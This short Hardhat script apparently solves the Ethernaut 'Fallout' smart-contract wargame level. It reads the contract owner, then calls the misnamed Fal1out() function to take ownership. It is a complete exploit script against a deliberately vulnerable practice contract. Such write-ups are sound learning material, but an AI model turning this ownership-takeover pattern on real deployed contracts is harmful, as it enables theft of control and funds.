const { ethers } = require("hardhat");

const CONTRACT_ADDRESS = "0x6D544390Eb535d61e196c87d6B9c80dCD8628Acd";
const PLAYER_ADDRESS = "0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f";

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  const contract = await ethers.getContractAt(
    "Fallout",
    CONTRACT_ADDRESS,
    signer
  );
  const owner = await contract.owner();
  console.log(owner);

  await contract.Fal1out();
  const newowner = await contract.owner();
  console.log(newowner);
}

main().catch((error) => {
  console.error(error);
  // eslint-disable-next-line no-process-exit
  process.exit(1);
});
